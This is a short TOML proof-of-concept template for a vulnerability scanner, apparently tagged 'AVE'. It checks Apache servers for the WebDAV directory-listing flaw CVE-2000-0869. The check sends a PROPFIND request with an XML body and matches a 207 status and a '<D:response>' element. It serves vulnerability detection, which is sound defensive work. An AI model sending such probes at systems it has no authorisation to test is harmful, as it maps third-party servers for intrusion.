[exploit]
exp_urls = []
poc_urls = ["https://www.exploit-db.com/exploits/20210"]

[info]
author = "ave"
description = "向目标 Apache 服务器发送 PROPFIND 请求，验证 WebDAV 模块是否允许未授权目录列举"
id = "POC-AVE-2000-0639"
name = "Apache WebDAV 目录列举漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0639"]
vuln_id = [
    "CVE-2000-0869",
    "AVE-2000-0639",
]

[poc]
logic = "all"

[[poc.requests]]
method = "PROPFIND"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = """
<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:">
  <D:prop>
    <D:resourcetype/>
    <D:displayname/>
  </D:prop>
</D:propfind>"""
type = "raw"

[poc.requests.headers]
Content-Type = "application/xml"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [207]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<D:response>"]
